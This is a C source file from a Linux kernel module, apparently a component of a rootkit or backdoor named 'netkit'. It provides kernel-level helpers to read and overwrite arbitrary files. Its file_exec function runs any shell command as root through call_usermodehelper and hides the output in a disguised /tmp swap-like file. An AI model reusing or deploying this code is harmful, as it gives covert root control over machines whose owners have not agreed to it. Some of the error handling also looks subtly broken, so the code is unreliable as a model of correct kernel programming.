#include <linux/types.h>
#include <linux/slab.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/umh.h>

#include "file.h"

#include "mem.h"
#include "debug.h"

int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
{
    struct file *file;
    char *tmp_buf;
    int retv = 0;

    NETKIT_LOG("[*] reading file '%s'...\n", filename);
    file = filp_open(filename, O_RDONLY | (force_o_largefile() ? O_LARGEFILE : 0), 0);
    if (IS_ERR(file))
    {
        NETKIT_LOG("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    tmp_buf = kzmalloc(4096, GFP_KERNEL);
    if (IS_ERR(tmp_buf))
    {
        retv = PTR_ERR(tmp_buf);
        goto LAB_OUT_NO_FILP;
    }

    retv = kernel_read(file, tmp_buf, 4096, NULL);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to read file\n");
        goto LAB_OUT;
    }

    *out_buflen = retv;
    *out_buf = kzmalloc(*out_buflen, GFP_KERNEL);
    if (IS_ERR(*out_buf))
    {
        *out_buf = NULL;
        *out_buflen = 0;
        retv = PTR_ERR(*out_buf);

        goto LAB_OUT;
    }

    memcpy(*out_buf, tmp_buf, *out_buflen);

    while (retv == 4096)
    {
        retv = kernel_read(file, tmp_buf, 4096, (loff_t *)out_buflen);
        if (retv < 0)
        {
            NETKIT_LOG("[!] failed to read bytes\n");
            goto LAB_OUT;
        }
    
        *out_buf = kzrealloc(*out_buf, *out_buflen, *out_buflen + retv);
        if (IS_ERR(*out_buf))
        {
            NETKIT_LOG("[!] failed to realloc\n");
            retv = PTR_ERR(*out_buf);
            *out_buf = NULL;
            *out_buflen = 0;
            
            goto LAB_OUT;
        }
        
        memcpy(*out_buf + *out_buflen, tmp_buf, retv);
        *out_buflen += retv;
    }
    
    NETKIT_LOG("[*] read %lu bytes...\n", *out_buflen);

LAB_OUT:
    filp_close(file, NULL);
LAB_OUT_NO_FILP:
    kzfree(tmp_buf, 4096);

    if (retv >= 0)
        return 0;

    return retv;
}

int file_write(const char *filename, const u8 *content, size_t content_len)
{
    struct file *file;
    int retv;

    file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0);
    if (IS_ERR(file))
    {
        NETKIT_LOG("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    NETKIT_LOG("[*] writing to '%s' size: %ld\n", filename, content_len);
    retv = kernel_write(file, content, content_len, 0);
    filp_close(file, NULL);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to write to file\n");
        return retv;
    }
    
    return retv;
}

int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
{
    #define SHELL_PATH "/bin/bash"
    #define STDOUT_FILE "/tmp/fb0.swp"
    #define BASH_POSTFIX " 1>" STDOUT_FILE " 2>\\&1"

    char* envp[] = {"HOME=/", "PWD=/", "TERM=linux", "USER=root", "SHELL=" SHELL_PATH, "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char* argv[] = {SHELL_PATH, "-c", NULL, NULL};
    size_t bash_cmd_len;
    int cmd_retv;
    int retv;

    bash_cmd_len = strlen(cmd) + strlen(BASH_POSTFIX) + 1; 
    
    argv[2] = kzmalloc(bash_cmd_len, GFP_KERNEL);
    if (IS_ERR(argv[2]))
        return PTR_ERR(argv[2]);

    sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);

    NETKIT_LOG("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
    cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    kzfree(argv[2], bash_cmd_len);

    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
    NETKIT_LOG("[+] read %d bytes\n", retv);
    if (retv < 0)
        return retv;

    return cmd_retv;
}